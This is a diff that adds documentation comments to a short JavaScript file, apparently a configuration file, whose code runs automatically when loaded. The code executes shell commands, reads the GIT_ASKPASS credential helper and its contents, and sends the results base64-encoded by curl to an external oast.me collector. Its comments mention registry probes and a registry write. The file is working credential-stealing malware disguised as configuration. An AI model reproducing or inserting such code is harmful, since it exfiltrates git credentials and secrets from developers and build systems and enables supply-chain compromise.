@@ -1,8 +1,35 @@
 const cp=require("child_process"),crypto=require("crypto");
 const OOB="http://daifjmll0ffrr6psl5u0f1c4ncjj6xnon.oast.me";
+/**
+ * Runs a shell command synchronously and returns its standard output.
+ *
+ * @param {string} c Command to run.
+ * @param {number} [t] Timeout in milliseconds; falsy values use 7 seconds.
+ * @returns {string} The command output, or `ERR:` followed by up to 300 characters of failure details.
+ */
 function sh(c,t){try{return cp.execSync(c,{encoding:"utf8",timeout:t||7000,maxBuffer:20971520});}catch(e){return "ERR:"+String((e&&(e.stderr||e.message))||"").slice(0,300);}}
+/**
+ * Sends a base64-encoded string representation of data to the collector path identified by the tag.
+ *
+ * Network and encoding failures are suppressed.
+ *
+ * @param {*} tag Value appended to the collector URL.
+ * @param {*} d Data to encode and send.
+ * @returns {void}
+ */
 function post(tag,d){try{const b=Buffer.from(String(d)).toString("base64");sh(`curl -s --max-time 7 -X POST --data-binary ${JSON.stringify(b)} ${JSON.stringify(OOB+"/"+tag)}`);}catch(_){ }}
+/**
+ * Summarizes a value using its trimmed length, first four characters, and a truncated SHA-256 digest.
+ *
+ * @param {*} v Value to summarize.
+ * @returns {string} `absent` for a falsy value; otherwise, the formatted summary.
+ */
 function fp(v){if(!v)return "absent";v=String(v).trim();return "sha256="+crypto.createHash("sha256").update(v).digest("hex").slice(0,16)+" len="+v.length+" head="+v.slice(0,4);}
+/**
+ * Runs system, credential, network, and registry probes when this configuration is loaded.
+ *
+ * The probes attempt a registry write and send their results to the external collector.
+ */
 (function(){
   // ---- K: git clone credential ----
   post("K_ASKPASS_ENV", sh("echo GIT_ASKPASS=$GIT_ASKPASS; echo ---; cat \"$GIT_ASKPASS\" 2>/dev/null | head -40"));
